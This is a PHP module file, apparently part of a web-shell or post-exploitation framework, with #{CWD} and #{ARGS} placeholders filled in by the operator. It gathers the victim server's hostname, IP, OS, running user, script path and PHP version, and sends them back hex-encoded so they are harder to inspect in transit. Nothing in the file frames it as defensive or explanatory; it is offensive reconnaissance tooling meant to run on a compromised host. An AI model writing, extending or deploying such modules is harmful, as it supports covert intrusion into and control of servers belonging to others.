#<?php


class Module_sysinfo
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function getUsername()
    {
        $phpuname_fields = explode(" ", php_uname());
        if ($phpuname_fields[0] === "Windows")
            return @php_uname('n') . "\\" . getenv("username");
        
        $user_id = @posix_getuid();
        $user_info = @posix_getpwuid($user_id);
        return $user_info['name'];
    }

    private function doSysinfo()
    {
        $output = "";

        $hostname = @php_uname('n');
        $ip = @gethostbyname(php_uname('n'));
        $os = @php_uname();
        $user = $this->getUsername();
        $path = $_SERVER["SCRIPT_FILENAME"];
        $version = @phpversion();

        $output  = "Hostname: $hostname" . PHP_EOL;
        $output .= "IP: $ip" . PHP_EOL;
        $output .= "OS: $os" . PHP_EOL;
        $output .= "User: $user" . PHP_EOL;
        $output .= "Path: $path" . PHP_EOL;
        $output .= "Version: $version" . PHP_EOL;

        return $output;
    }

    public function execute($args)
    {
        $result = "";
        $parsed_args = $this->parseArgs(hex2bin($args));
        $result = $this->doSysinfo();
        return $this->generateResponse($result);
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_sysinfo($cwd);
print($module->execute($args));